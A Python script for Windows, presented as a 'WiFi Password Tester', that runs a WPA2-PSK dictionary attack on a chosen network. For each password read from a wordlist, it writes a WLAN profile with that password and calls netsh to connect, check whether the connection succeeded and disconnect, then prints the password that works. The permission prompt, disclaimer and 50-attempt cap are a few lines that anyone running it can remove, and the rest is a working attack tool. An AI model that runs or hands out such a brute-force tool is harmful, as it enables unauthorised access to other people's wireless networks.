#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
WiFi Password Tester Tool - Interactive Mode
Educational / Security Testing Tool ONLY
Use only on networks you OWN or have explicit permission to test.
"""

import subprocess
import time
import os
import sys
import tempfile
from pathlib import Path
from xml.sax.saxutils import escape as xml_escape

MAX_ATTEMPTS = 50


def banner():
    art = r"""
__        ___ _ _          _____         _            _
\ \      / (_) | |        |_   _|       | |          | |
 \ \ /\ / / _| | | ___      | | ___  ___| |_ ___  ___| |_ ___ _ __
  \ V  V / | | | |/ _ \     | |/ _ \/ __| __/ _ \/ __| __/ _ \ '__|
   \_/\_/  | | | |  __/     | |  __/\__ \ ||  __/ (__| ||  __/ |
           |_|_|_|\___|     \_/\___||___/\__\___|\___|\__\___|_|
"""
    print(
        "\n\x1b[1;33m"
        + art
        + "\x1b[0m"
        + """
    WPA2-PSK Dictionary Attack Tester (Windows netsh method)
    ======================================================
    """
    )


def is_connected_to_ssid(target_ssid: str) -> bool:
    try:
        output = subprocess.check_output(
            ["netsh", "wlan", "show", "interfaces"],
            text=True,
            stderr=subprocess.STDOUT,
        )
        state = current_ssid = None
        for line in output.splitlines():
            line = line.strip()
            if line.startswith("State"):
                state = line.split(":", 1)[1].strip()
            if line.startswith("SSID") and not line.startswith("BSSID"):
                current_ssid = line.split(":", 1)[1].strip()
        return state == "connected" and current_ssid == target_ssid
    except Exception:
        return False


def require_permission():
    print("SAFETY NOTICE: Use only on networks you own or have explicit permission to test.")
    ack = input('Type "I HAVE PERMISSION" to continue: ').strip()
    if ack != "I HAVE PERMISSION":
        print("Permission not confirmed. Exiting.")
        sys.exit(1)


def get_user_input():
    require_permission()

    print("Please enter the following details:")
    print("-" * 50)

    ssid = input("SSID (WiFi name): ").strip()
    if not ssid:
        print("SSID cannot be empty!")
        sys.exit(1)

    wordlist = input("Wordlist file path (e.g. rockyou.txt or C:/path/to/list.txt): ").strip()
    wordlist_path = Path(wordlist)
    if not wordlist_path.is_file():
        print(f"Error: File not found -> {wordlist}")
        sys.exit(1)

    while True:
        try:
            delay_str = input("Delay per attempt (seconds, recommended 6-8): ").strip()
            delay = float(delay_str)
            if delay < 2.0:
                print("Delay too low, setting minimum 4.0 seconds for reliability.")
                delay = 4.0
            break
        except ValueError:
            print("Please enter a valid number (e.g. 7 or 6.5)")

    print("-" * 50)
    return ssid, wordlist_path, delay


def main():
    banner()

    print("WiFi Password Tester - Interactive Mode")
    print("Use only for educational purposes on YOUR OWN network!\n")

    ssid, wordlist_path, delay = get_user_input()

    print(f"\nTarget SSID     : {ssid}")
    print(f"Wordlist        : {wordlist_path}")
    print(f"Delay           : {delay:.1f} seconds")
    print(f"Safety limit    : {MAX_ATTEMPTS} attempt(s) max")

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Failed to read wordlist: {e}")
        sys.exit(1)

    if len(passwords) > MAX_ATTEMPTS:
        print(f"Wordlist has {len(passwords):,} entries; only the first {MAX_ATTEMPTS} will be tried.")

    print("\nStarting... (Press Ctrl+C to stop anytime)\n")

    temp_xml_path = None
    try:
        with tempfile.NamedTemporaryFile("w", suffix=".xml", delete=False, encoding="utf-8") as tmp:
            temp_xml_path = tmp.name

        attempt_count = min(len(passwords), MAX_ATTEMPTS)
        for idx, password in enumerate(passwords[:attempt_count], 1):
            try:
                print(f"[{idx:,}/{attempt_count:,}] Trying: {password:<30}", end="\r", flush=True)

                ssid_xml = xml_escape(ssid)
                password_xml = xml_escape(password)
                xml_content = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid_xml}</name>
    <SSIDConfig>
        <SSID><name>{ssid_xml}</name></SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password_xml}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""

                with open(temp_xml_path, "w", encoding="utf-8") as f:
                    f.write(xml_content)

                subprocess.run(["netsh", "wlan", "delete", "profile", f"name={ssid}"], capture_output=True)

                add = subprocess.run(
                    ["netsh", "wlan", "add", "profile", f"filename={temp_xml_path}"],
                    capture_output=True,
                    text=True,
                )
                if add.returncode != 0:
                    continue

                subprocess.run(["netsh", "wlan", "connect", f"name={ssid}"], capture_output=True)

                time.sleep(delay)

                if is_connected_to_ssid(ssid):
                    print("\n" + "=" * 70)
                    print(f"  SUCCESS! Password found: {password}")
                    print("  Connected! Remember to change it immediately.")
                    print("=" * 70)
                    break

                subprocess.run(["netsh", "wlan", "disconnect"], capture_output=True)
                time.sleep(0.5)
                subprocess.run(["netsh", "wlan", "delete", "profile", f"name={ssid}"], capture_output=True)

            except KeyboardInterrupt:
                print("\nStopped by user.")
                break
            except Exception as e:
                print(f"\nError: {e}")
                continue
        else:
            print("\n" + "=" * 70)
            print("No match found in the wordlist.")
            print("=" * 70)
    finally:
        if temp_xml_path and os.path.exists(temp_xml_path):
            os.remove(temp_xml_path)


if __name__ == "__main__":
    if os.name != "nt":
        print("This script is for Windows only (uses netsh)")
        sys.exit(1)
    main()
